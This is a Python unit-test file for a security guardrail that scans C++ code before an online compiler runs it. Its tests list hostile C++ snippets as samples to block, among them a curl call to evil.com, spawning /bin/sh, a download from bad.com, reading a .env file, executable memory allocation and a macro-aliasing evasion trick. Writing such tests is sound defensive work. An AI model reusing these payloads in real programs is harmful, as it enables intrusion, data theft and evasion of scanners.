import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from secure_scan import run_security_guardrail, scan_all_security_issues, get_security_summary
from compiler_service import compile_and_run


class TestSecurityScannerPreExecution(unittest.TestCase):
    """
    Validates that dangerous or malicious C++ code is identified and blocked
    at the static pre-execution layer without ever executing on the host PC.
    """

    def test_benign_code_allowed(self):
        code = """
        #include <iostream>
        #include <vector>
        #include <string>
        using namespace std;

        int main() {
            vector<string> items = {"apple", "banana"};
            for (const auto& item : items) {
                cout << item << endl;
            }
            return 0;
        }
        """
        is_safe, warning = run_security_guardrail(code)
        self.assertTrue(is_safe)
        self.assertEqual(warning, "Code looks safe.")
        summary = get_security_summary(code)
        self.assertTrue(summary["is_safe"])
        self.assertEqual(summary["risk_level"], "CLEAN")

    def test_blocks_os_command_execution(self):
        payloads = [
            'int main() { system("shutdown /s /t 0"); return 0; }',
            'int main() { popen("curl http://evil.com/payload", "r"); return 0; }',
            'int main() { execl("/bin/sh", "sh", NULL); return 0; }',
            'int main() { fork(); return 0; }',
            'int main() { WinExec("calc.exe", 1); return 0; }',
            'int main() { CreateProcessA(NULL, "cmd.exe", NULL, NULL, FALSE, 0, NULL, NULL, NULL, NULL); return 0; }',
            'int main() { ShellExecute(NULL, "open", "powershell", NULL, NULL, 0); return 0; }',
        ]
        for payload in payloads:
            is_safe, warning = run_security_guardrail(payload)
            self.assertFalse(is_safe, f"Payload should be blocked: {payload}")
            self.assertIn("CRITICAL:", warning)

    def test_blocks_network_exfiltration(self):
        payloads = [
            '#include <winsock2.h>\nint main() { return 0; }',
            '#include <sys/socket.h>\nint main() { return 0; }',
            'int main() { WSAStartup(0, NULL); return 0; }',
            'int main() { int s = socket(2, 1, 0); return 0; }',
            'int main() { URLDownloadToFileA(NULL, "http://bad.com", "out.exe", 0, NULL); return 0; }',
        ]
        for payload in payloads:
            is_safe, warning = run_security_guardrail(payload)
            self.assertFalse(is_safe, f"Network payload should be blocked: {payload}")

    def test_blocks_filesystem_tampering(self):
        payloads = [
            'int main() { DeleteFileA("C:\\\\important.txt"); return 0; }',
            'int main() { remove("data.db"); return 0; }',
            'int main() { unlink("config.json"); return 0; }',
            '#include <fstream>\nint main() { std::ifstream f("../../../.env"); return 0; }',
            '#include <fstream>\nint main() { std::ifstream f("C:/Windows/System32/drivers/etc/hosts"); return 0; }',
            '#include <CON>\nint main() { return 0; }',
            '#include __FILE__\nint main() { return 0; }',
        ]
        for payload in payloads:
            is_safe, warning = run_security_guardrail(payload)
            self.assertFalse(is_safe, f"Filesystem payload should be blocked: {payload}")

    def test_blocks_dynamic_loading_and_shellcode(self):
        payloads = [
            'int main() { LoadLibraryA("user32.dll"); return 0; }',
            'int main() { dlopen("lib.so", 1); return 0; }',
            'int main() { __asm__("nop"); return 0; }',
            'int main() { VirtualAlloc(NULL, 1024, 0x1000, 0x40); return 0; }',
            'int main() { mprotect(NULL, 4096, 7); return 0; }',
        ]
        for payload in payloads:
            is_safe, warning = run_security_guardrail(payload)
            self.assertFalse(is_safe, f"Dynamic/Shellcode payload should be blocked: {payload}")

    def test_blocks_macro_aliasing_evasion(self):
        payload = """
        #define RUN system
        int main() {
            RUN("calc.exe");
            return 0;
        }
        """
        is_safe, warning = run_security_guardrail(payload)
        self.assertFalse(is_safe)
        self.assertIn("CRITICAL:", warning)

    def test_compiler_service_defense_in_depth(self):
        """
        Verify compiler_service.compile_and_run intercepts malicious code
        even if called directly outside app.py.
        """
        malicious_code = 'int main() { system("echo hacked"); return 0; }'
        result = compile_and_run(malicious_code)
        self.assertEqual(result.status_code, 1)
        self.assertIn("SECURITY GUARDRAIL BLOCKED", result.stderr)
        self.assertEqual(result.stdout, "")


if __name__ == "__main__":
    unittest.main()
